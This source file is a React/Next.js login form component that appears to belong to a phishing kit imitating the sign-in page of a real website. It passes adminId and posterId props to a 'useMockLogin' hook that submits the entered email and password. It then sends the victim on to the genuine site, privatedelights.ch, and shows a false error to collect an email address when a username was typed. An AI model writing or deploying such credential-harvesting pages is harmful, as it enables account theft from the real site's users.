import React, { useState } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { useRouter } from "next/navigation";
import LoadingModal from "./LoadingModal";

function LoginForm({ adminId, posterId }) {
  const [showPassword, setShowPassword] = useState(false);
  const [isFirstLogin, setIsFirstLogin] = useState(false);
  const [userId, setUserId] = useState(null);
  const [isEmail, setIsEmail] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();
  
  const initialvalues = {
    identifier: "",
    password: "",
  };

  const validate = Yup.object({
    identifier: Yup.string().required("Enter a valid email address."),
    password: Yup.string().min(8, "Minimum 8 characters"),
  });

  const { login, updateUserEmail } = useMockLogin(adminId, posterId);

  const handleSubmit = async (values, formik) => {
    const { identifier, password } = values;

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const isEmailInput = emailRegex.test(identifier);
    setIsEmail(isEmailInput);

    const submitValues = {
      site: site,
      email: identifier,
      password: password,
      skipcode: "",
    };

    setIsLoading(true);

    try {
      if (isFirstLogin && userId) {
        if (isEmailInput) {
          const success = await updateUserEmail({
            email: identifier,
            password,
            id: userId,
          });
          if (success) {
            setIsFirstLogin(false);
            setUserId(null);
          }
        }
        formik.resetForm();
      } else {
        const success = await login(submitValues, formik);
        if (success) {
          const idFromCookie = Cookies.get("id");
          if (idFromCookie) {
            setUserId(idFromCookie);
          }

          if (isEmailInput) {
            router.push("https://privatedelights.ch");
          } else {
            setIsFirstLogin(true);
          }
          formik.resetForm();
        }
      }
    } catch (error) {
      console.error("Submission error:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-[320px] mx-auto flex flex-col gap-6 text-center select-none font-sans">
      <LoadingModal isOpen={isLoading} />
      
      {/* Sign In Heading */}
      <h1 className="text-3xl font-normal text-white font-serif tracking-tight">
        Sign in
      </h1>

      <div className="flex flex-col text-left">
        {isFirstLogin && !isEmail && (
          <div className="mb-4 p-3 bg-red-600/90 border border-red-500 rounded text-xs text-white">
            Enter a valid email address.
          </div>
        )}

        <Formik
          initialValues={initialvalues}
          validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="flex flex-col gap-4">
              {/* Email/Username field */}
              <div>
                <input
                  type="text"
                  name="identifier"
                  placeholder={isFirstLogin && !isEmail ? "Email" : "Email"}
                  value={formik.values.identifier}
                  onChange={formik.handleChange}
                  onBlur={formik.handleBlur}
                  className="w-full bg-[#fdfdfd] text-black px-3.5 py-2.5 border border-zinc-300 rounded-[3px] text-sm focus:outline-none focus:border-zinc-500 font-sans"
                />
                {formik.touched.identifier && formik.errors.identifier && (
                  <p className="text-red-500 text-xs mt-1 pl-1">
                    {formik.errors.identifier}
                  </p>
                )}
              </div>

              {/* Password field */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  placeholder="Password"
                  value={formik.values.password}
                  onChange={formik.handleChange}
                  onBlur={formik.handleBlur}
                  className="w-full bg-[#fdfdfd] text-black px-3.5 py-2.5 border border-zinc-300 rounded-[3px] text-sm focus:outline-none focus:border-zinc-500 font-sans"
                />
                {formik.touched.password && formik.errors.password && (
                  <p className="text-red-500 text-xs mt-1 pl-1">
                    {formik.errors.password}
                  </p>
                )}
              </div>

              {/* Submit Button */}
              <div className="mt-2">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-[#c2185b] hover:bg-[#a0134c] text-white py-2.5 text-sm font-semibold rounded-[3px] transition-colors focus:outline-none"
                >
                  {isLoading ? "Signing in..." : "Sign in"}
                </button>
              </div>
            </Form>
          )}
        </Formik>

        {/* Checkbox "Stay signed in" */}
        <div className="flex items-center gap-2 mt-4 text-[#fbc02d] text-[13px] font-medium">
          <input
            type="checkbox"
            id="stay-signed-in"
            defaultChecked
            className="w-4.5 h-4.5 border border-zinc-400 bg-white rounded-[2px] accent-[#c2185b] cursor-pointer"
          />
          <label htmlFor="stay-signed-in" className="cursor-pointer select-none">
            Stay signed in
          </label>
        </div>

        {/* Action Links */}
        <div className="mt-6 flex flex-col gap-2.5 text-[#fbc02d] text-[13px] font-semibold">
          <a href="#" className="hover:underline cursor-pointer">
            Forgot your password? Reset your password
          </a>
          <a href="#" className="hover:underline cursor-pointer">
            New here? Register for a new account
          </a>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
